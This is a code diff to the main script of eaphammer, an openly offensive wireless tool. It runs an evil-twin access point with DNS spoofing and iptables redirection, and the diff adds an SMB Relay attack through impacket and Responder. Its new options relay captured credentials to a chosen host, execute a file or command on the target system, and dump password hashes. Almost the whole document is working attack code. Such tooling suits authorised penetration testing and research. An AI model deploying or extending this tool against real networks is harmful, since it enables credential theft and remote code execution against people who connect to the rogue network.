@@ -5,7 +5,7 @@ import os
 import config
 import time
 
-from core import cert_manager, conf_manager, utils, responder
+from core import cert_manager, conf_manager, utils, responder, smbrelayx
 from argparse import ArgumentParser
 
 def cert_wizard():
@@ -39,7 +39,7 @@ def cert_wizard():
 
     cert_manager.bootstrap()
 
-def hostile_portal():
+def captive_portal():
     global responder
 
     try:
@@ -72,10 +72,19 @@ def hostile_portal():
         utils.Dnsmasq.hardstart('-C %s > dnsmasq.log 2>&1' % config.dnsmasq_cnf)
         utils.Dnsspoof.hardstart('-i %s -f %s > dnsspoof.log 2>&1' % (options['interface'], config.dnsspoof_cnf))
 
+        # start impacket SMB Relay server
+        if options['smb_relay']:
+
+            smb_relay = smbrelayx.SMBRelayX.get_instance()
+            smb_relay.configure(options)
+            smb_relay.start()
+
         # start Responder
-        responder = responder.Responder.get_instance()
-        responder.configure()
-        responder.start()
+        if options['responder']:
+
+            responder = responder.Responder.get_instance()
+            responder.configure()
+            responder.start()
 
         # set iptables policy, flush all tables for good measure
         utils.Iptables.accept_all()
@@ -101,79 +110,6 @@ def hostile_portal():
 
     except KeyboardInterrupt:
     
-        # kill daemons
-        utils.Hostapd.kill()
-        utils.Dnsmasq.kill()
-        utils.Dnsspoof.kill()
-        
-        # restore iptables to a clean state (policy, flush tables)
-        utils.Iptables.accept_all()
-        utils.Iptables.flush()
-        utils.Iptables.flush('nat')
-
-def captive_portal():
-
-    try:
-        # prepare environment
-        utils.NetworkManager.stop()
-        utils.wlan_clean()
-        utils.set_ipforward(1)
-
-        # initialize access point
-        if options['auth'] == 'open':
-            conf_manager.hostapd_open_cnf.configure(interface=options['interface'],
-                                            ssid=options['essid'],
-                                            hw_mode=options['hw_mode'],
-                                            bssid=options['bssid'],
-                                            channel=options['channel'])
-        else:
-            conf_manager.hostapd_wpe_cnf.configure(interface=options['interface'],
-                                            ssid=options['essid'],
-                                            hw_mode=options['hw_mode'],
-                                            bssid=options['bssid'],
-                                            channel=options['channel'],
-                                            wpa=options['wpa'])
-
-        utils.Hostapd.hardstart('-s %s' % config.hostapd_cnf, verbose=False)
-
-        # configure routing 
-        os.system('ifconfig %s 10.0.0.1 netmask 255.255.255.0' % options['interface'])
-        os.system('route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1')
-
-        # start dhcp and dns: all dns queries should resolve to PHY
-        utils.Dnsmasq.hardstart('-C %s > dnsmasq.log 2>&1' % config.dnsmasq_cnf)
-        utils.Dnsspoof.hardstart('-i %s -f %s > dnsmasq.log 2>&1' % (options['interface'], config.dnsspoof_cnf))
-
-        # start httpd
-        utils.Httpd.start()
-
-        # set iptables policy, flush all tables for good measure
-        utils.Iptables.accept_all()
-        utils.Iptables.flush()
-        utils.Iptables.flush('nat')
-
-        # use iptables to redirect all DNS and HTTP(S) traffic to PHY
-        utils.Iptables.route_dns2_addr('10.0.0.1', options['interface'])
-        utils.Iptables.route_http2_addr('10.0.0.1', options['interface'])
-        
-        # pause execution until use quits
-        raw_input('press enter to quit...')
-
-        # kill daemons
-        utils.Hostapd.kill()
-        utils.Dnsmasq.kill()
-        utils.Dnsspoof.kill()
-
-        # stop services
-        utils.Httpd.stop()
-        
-        # restore iptables to a clean state (policy, flush tables)
-        utils.Iptables.accept_all()
-        utils.Iptables.flush()
-        utils.Iptables.flush('nat')
-
-    except KeyboardInterrupt:
-
         # kill daemons
         utils.Hostapd.kill()
         utils.Dnsmasq.kill()
@@ -214,68 +150,149 @@ def set_options():
 
     parser = ArgumentParser()
 
-    parser.add_argument('--cert-wizard',
+    mgroup = parser.add_argument_group("eaphammer", "Options for eaphammer")
+
+    mgroup.add_argument('--cert-wizard',
                     dest='cert_wizard',
                     action='store_true',
                     help='Use this flag to create a new RADIUS cert for your AP')
 
-    parser.add_argument('-i', '--interface',
+    mgroup.add_argument('-i', '--interface',
                     dest='interface',
                     type=str,
                     help='The phy interface on which to create the AP')
 
-    parser.add_argument('-e', '--essid',
+    mgroup.add_argument('-e', '--essid',
                     dest='essid',
                     default='eaphammer',
                     type=str,
                     help='Specify access point ESSID')
 
-    parser.add_argument('-b', '--bssid',
+    mgroup.add_argument('-b', '--bssid',
                     dest='bssid',
                     default='00:11:22:33:44:00',
                     type=str,
                     help='Specify access point BSSID')
 
-    parser.add_argument('--hw-mode',
+    mgroup.add_argument('--hw-mode',
                     dest='hw_mode',
                     type=str,
                     default='g',
                     help='Specify access point hardware mode (default: g).')
 
-    parser.add_argument('-c', '--channel',
+    mgroup.add_argument('-c', '--channel',
                     dest='channel',
                     type=int,
                     default=1,
                     help='Specify access point channel')
 
-    parser.add_argument('--wpa',
+    mgroup.add_argument('--wpa',
                     dest='wpa',
                     type=int,
                     choices=[1, 2],
                     default=2,
                     help='Specify WPA type (default: 2).')
 
-    parser.add_argument('--auth',
+    mgroup.add_argument('--auth',
                     dest='auth',
                     type=str,
                     choices=['peap', 'ttls', 'open'],
                     default='open',
                     help='Specify auth type (default: open).')
 
-    parser.add_argument('--creds',
+    mgroup.add_argument('--creds',
                     dest='reap_creds',
                     action='store_true',
                     help='Harvest EAP creds using evil twin attack')
 
-    parser.add_argument('--hostile-portal',
-                    dest='hostile_portal',
-                    action='store_true',
-                    help='Force clients to connect to hostile portal')
-
-    parser.add_argument('--captive-portal',
+    mgroup.add_argument('--captive-portal',
                     dest='captive_portal',
                     action='store_true',
                     help='Force clients to connect to a captive portal')
+
+    resp_group = parser.add_argument_group("Responder", "Options for Responder")
+
+    resp_group.add_argument('--responder',
+                    dest='responder',
+                    action='store_true',
+                    help='Run Responder.')
+
+    smbrx_group = parser.add_argument_group("SMB Relay", "Options for SMB Relay")
+
+    smbrx_group.add_argument('--smb-relay',
+                    dest='smb_relay',
+                    action='store_true',
+                    help='Perform an SMB Relay attack.')
+
+    smbrx_group.add_argument('--smbr-target',
+                dest='target',
+                metavar='HOST',
+                type=str,
+                help='Host to relay the credentials to, if not it will relay it back to the client')
+
+    smbrx_group.add_argument('--smbr-rstatus',
+                        dest='return_status',
+                        choices={'success', 'denied', 'logon_failure'},
+                        default='success',
+                        help='Status to return after client performed authentication. Default: "success".')
+
+    smbrx_group.add_argument('--smbr-exec',
+                        dest='smbr_exec',
+                        type=str,
+                        required=False,
+                        metavar='FILE',
+                        help='File to execute on the target system. If not specified, hashes will be dumped '
+                        '(secretsdump.py must be in the same directory)')
+
+    smbrx_group.add_argument('--smbr-command',
+                        dest='command',
+                        type=str,
+                        required=False,
+                        metavar='COMMAND',
+                        help='Command to execute on target system. If not specified, hashes will be dumped '
+                             '(secretsdump.py must be in the same directory)')
+
+    smbrx_group.add_argument('--smbr-one-shot',
+                        dest='one_shot',
+                        action='store_true',
+                        help='After successful authentication, only execute the attack once for each target')
+
+    smbrx_group.add_argument('--smbr-debug',
+                        dest='smbr_debug',
+                        action='store_true',
+                        help='Run in debug mode')
+
+    smbrx_group.add_argument('--smbr-codec',
+                        dest='codec',
+                        action='store',
+                        help='Sets encoding used (codec) from the target\'s output (default '
+                                                       '"%s"). If errors are detected, run chcp.com at the target, '
+                                                       'map the result with '
+                                                       'https://docs.python.org/2.4/lib/standard-encodings.html and then execute wmiexec.py '
+                                                       'again with --smbr-codec and the corresponding codec ' % sys.getdefaultencoding())
+
+    smbrx_group.add_argument('--smbr-ofile',
+                        dest='outputfile',
+                        type=str,
+                        help='base output filename for encrypted hashes. Suffixes will be added for ntlm and ntlmv2')
+
+    smbrx_group.add_argument('--smbr-machine-account',
+                        dest='machine_account',
+                        type=str,
+                        required=False,
+                        help='Domain machine account to use when interacting with the domain to grab a session key for '
+                             'signing, format is domain/machine_name')
+
+    smbrx_group.add_argument('--smbr-machine-hashes',
+                        dest='machine_hashes',
+                        type=str,
+                        metavar="LMHASH:NTHASH",
+                        help='Domain machine hashes, format is LMHASH:NTHASH')
+
+    smbrx_group.add_argument('--smbr-domain',
+                        dest='domain',
+                        type=str,
+                        help='Domain FQDN or IP to connect using NETLOGON')
 
     args = parser.parse_args()
 
@@ -315,7 +332,5 @@ if __name__ == '__main__':
         cert_wizard()
     elif options['captive_portal']:
         captive_portal()
-    elif options['hostile_portal']:
-        hostile_portal()
     else:
         reap_creds()
